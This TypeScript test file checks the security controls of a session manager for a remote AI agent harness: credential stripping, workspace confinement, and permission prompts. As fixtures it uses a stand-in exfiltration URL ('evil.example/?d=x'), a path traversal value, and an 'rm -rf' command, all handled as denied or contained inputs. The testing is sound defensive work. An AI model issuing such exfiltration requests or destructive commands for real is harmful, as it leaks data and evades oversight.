import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, realpathSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { AgentToHubMessage, ManagedMcpServer } from '@remote-harness/shared';
import { SessionManager } from '../src/sessionManager.ts';

// A stand-in for the SDK's query(): records the options it was given and ends immediately.
function fakeQuery() {
  const calls: any[] = [];
  const query = ((args: any) => {
    calls.push(args.options);
    return {
      [Symbol.asyncIterator]: async function* () {},
      interrupt: async () => {},
      setPermissionMode: async () => {},
      setModel: async () => {},
      applyFlagSettings: async () => {},
      setMcpServers: async () => {},
      mcpServerStatus: async () => [],
      close: () => {},
    };
  }) as never;
  return { calls, query };
}

const make = (opts: Record<string, unknown> = {}) => {
  const sent: AgentToHubMessage[] = [];
  const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-test-')));
  const fq = fakeQuery();
  const manager = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], (m) => sent.push(m), { query: fq.query, ...opts } as never);
  return { manager, sent, dir, calls: fq.calls };
};
const start = (m: SessionManager, text = 'hi') => m.handleUserInput({ type: 'user_input', sessionId: 't1', tempId: 't1', text });

describe('SessionManager', () => {
  it('reports an error for an unknown session id instead of silently starting a fresh conversation', () => {
    const { manager, sent, calls } = make();
    manager.handleUserInput({ type: 'user_input', sessionId: 'not-a-known-session', text: 'hi' });
    assert.equal(sent.length, 1);
    assert.equal(sent[0].type, 'error');
    assert.match((sent[0] as { message: string }).message, /unknown session/i);
    assert.equal(calls.length, 0, 'no conversation may be started');
    assert.deepEqual(manager.summaries(), []);
  });

  it('only uses the MCP servers the hub installed: a repo\'s own .mcp.json is ignored (strictMcpConfig)', () => {
    const { manager, calls } = make();
    start(manager);
    assert.equal(calls[0].strictMcpConfig, true);
  });

  it('never hands the hub credentials to the Claude process, with or without an account profile', () => {
    process.env.HUB_TOKEN = 'tenant-wide-secret';
    process.env.HUB_URL = 'wss://hub.example/agent';
    try {
      const a = make();
      start(a.manager);
      assert.equal('HUB_TOKEN' in (a.calls[0].env ?? {}), false);
      assert.equal('HUB_URL' in (a.calls[0].env ?? {}), false);
      assert.ok(a.calls[0].env?.PATH, 'the rest of the environment is still there');

      const sent: AgentToHubMessage[] = [];
      const dir = mkdtempSync(join(tmpdir(), 'sm-test-'));
      const fq = fakeQuery();
      const m = new SessionManager(dir, dir, [{ id: 'work', label: 'work', configDir: join(dir, 'cfg') }], (x) => sent.push(x), { query: fq.query } as never);
      start(m);
      assert.equal('HUB_TOKEN' in (fq.calls[0].env ?? {}), false);
      assert.equal(fq.calls[0].env.CLAUDE_CONFIG_DIR, join(dir, 'cfg'));
    } finally {
      delete process.env.HUB_TOKEN;
      delete process.env.HUB_URL;
    }
  });

  it('keeps a new session\'s working directory inside the workspace', () => {
    const { manager, calls, dir } = make();
    manager.handleUserInput({ type: 'user_input', sessionId: 't1', tempId: 't1', text: 'hi', cwd: '../../etc' });
    assert.equal(calls[0].cwd, dir);
  });

  it('in a managed worker, the agent\'s own files and WebFetch still ask; ordinary work does not', async () => {
    const { manager, sent, calls, dir } = make({ managed: true, protectedPaths: ['/opt/agent'] });
    start(manager);
    const canUse = calls[0].canUseTool as (tool: string, input: Record<string, unknown>, o: { signal: AbortSignal }) => Promise<{ behavior: string }>;
    const signal = new AbortController().signal;
    assert.equal((await canUse('Bash', { command: 'ls' }, { signal })).behavior, 'allow');
    assert.equal((await canUse('Write', { file_path: join(dir, 'a.txt') }, { signal })).behavior, 'allow');

    const pending = canUse('WebFetch', { url: 'https://evil.example/?d=x' }, { signal });
    await new Promise((r) => setTimeout(r, 20));
    const req = sent.find((m) => m.type === 'permission_request') as { requestId: string; toolName: string };
    assert.equal(req.toolName, 'WebFetch');
    manager.resolvePermission(req.requestId, 'deny');
    assert.equal((await pending).behavior, 'deny');

    const pending2 = canUse('Write', { file_path: '/opt/agent/src/index.ts' }, { signal });
    await new Promise((r) => setTimeout(r, 20));
    assert.ok(sent.filter((m) => m.type === 'permission_request').length >= 2, "writing the agent's own code asks");
    const req2 = sent.filter((m) => m.type === 'permission_request').at(-1) as { requestId: string };
    manager.resolvePermission(req2.requestId, 'deny');
    await pending2;
  });

  it('does not install a hub-pushed MCP server whose name collides with another\'s tool namespace', async () => {
    const { manager, calls } = make();
    const mk = (name: string): ManagedMcpServer => ({ name, url: 'https://x.example/', autoAllow: true, updatedAt: '' });
    await manager.setMcpServers([mk('good'), mk('a__b')]);
    start(manager);
    assert.deepEqual(Object.keys(calls[0].mcpServers), ['good']);
  });

  it('answers a pending permission card with a denial when its session ends, and prunes it', async () => {
    const { manager, sent, calls } = make();
    start(manager);
    const canUse = calls[0].canUseTool as (tool: string, input: Record<string, unknown>, o: { signal: AbortSignal }) => Promise<{ behavior: string }>;
    const p = canUse('Bash', { command: 'rm -rf x' }, { signal: new AbortController().signal });
    await new Promise((r) => setTimeout(r, 50)); // the (empty) fake session ends immediately
    const verdict = await Promise.race([p, new Promise((r) => setTimeout(() => r('HUNG'), 500))]);
    assert.deepEqual(typeof verdict === 'object' ? (verdict as { behavior: string }).behavior : verdict, 'deny');
    assert.ok(sent.some((m) => m.type === 'session_ended'));
  });

  it('reports a rejected model switch to the phone instead of crashing the agent', async () => {
    // The SDK rejects set_model for a model id its catalog doesn't know; an unhandled rejection used to kill the process.
    let release!: () => void;
    const held = new Promise<void>((r) => { release = r; });
    const fail = async () => { throw new Error('"claude-x" isn\'t described by this version\'s model catalog'); };
    const query = (() => ({
      [Symbol.asyncIterator]: async function* () { await held; },
      interrupt: fail, setPermissionMode: fail, setModel: fail, applyFlagSettings: fail,
      setMcpServers: async () => {}, mcpServerStatus: async () => [], close: () => {},
    })) as never;
    const sent: AgentToHubMessage[] = [];
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-test-')));
    const manager = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], (m) => sent.push(m), { query } as never);
    const unhandled: unknown[] = [];
    const onUnhandled = (e: unknown) => unhandled.push(e);
    process.on('unhandledRejection', onUnhandled);
    try {
      start(manager);
      manager.setModel('t1', 'claude-x');
      manager.setEffort('t1', 'high');
      manager.setPermissionMode('t1', 'default');
      manager.interrupt('t1');
      await new Promise((r) => setTimeout(r, 50));
      assert.deepEqual(unhandled, []);
      const errors = sent.filter((m) => m.type === 'error') as { message: string; sessionId?: string }[];
      assert.equal(errors.length, 4);
      assert.match(errors[0].message, /model catalog/);
    } finally {
      process.off('unhandledRejection', onUnhandled);
      release();
    }
  });

  it('streams the reply as it is written (sdk_partial) without storing the stream events themselves', async () => {
    const sent: AgentToHubMessage[] = [];
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'sm-test-')));
    const events = [
      { type: 'system', subtype: 'init', session_id: 'real-1', mcp_servers: [] },
      { type: 'stream_event', parent_tool_use_id: null, event: { type: 'message_start' } },
      { type: 'stream_event', parent_tool_use_id: null, event: { type: 'content_block_delta', delta: { type: 'text_delta', text: 'Hello' } } },
    ];
    let options: any;
    const query = ((args: any) => {
      options = args.options;
      return {
        [Symbol.asyncIterator]: async function* () {
          for (const e of events) yield e;
          await new Promise((r) => setTimeout(r, 400)); // the throttle sends the text while the reply is still going
          yield { type: 'assistant', uuid: 'u1', message: { content: [{ type: 'text', text: 'Hello there' }] } };
          yield { type: 'result', subtype: 'success', uuid: 'u2' };
        },
        interrupt: async () => {}, setPermissionMode: async () => {}, setModel: async () => {}, applyFlagSettings: async () => {},
        setMcpServers: async () => {}, mcpServerStatus: async () => [], close: () => {},
      };
    }) as never;
    const m = new SessionManager(dir, join(dir, 'data'), [{ id: 'default', label: 'default' }], (x) => sent.push(x), { query } as never);
    m.handleUserInput({ type: 'user_input', sessionId: 't1', tempId: 't1', text: 'hi' });
    await new Promise((r) => setTimeout(r, 700));
    assert.equal(options.includePartialMessages, true);
    const partials = sent.filter((x) => x.type === 'sdk_partial') as { sessionId: string; text: string }[];
    assert.deepEqual(partials.map((p) => [p.sessionId, p.text]), [['real-1', 'Hello']]);
    const forwarded = sent.filter((x) => x.type === 'sdk_message').map((x) => (x as { message: { type: string } }).message.type);
    assert.ok(!forwarded.includes('stream_event'), 'raw stream events never reach the hub');
    assert.deepEqual(forwarded, ['system', 'assistant', 'result']);
    const iPartial = sent.findIndex((x) => x.type === 'sdk_partial');
    const iAssistant = sent.findIndex((x) => x.type === 'sdk_message' && (x as { message: { type: string } }).message.type === 'assistant');
    assert.ok(iPartial < iAssistant);
  });
});
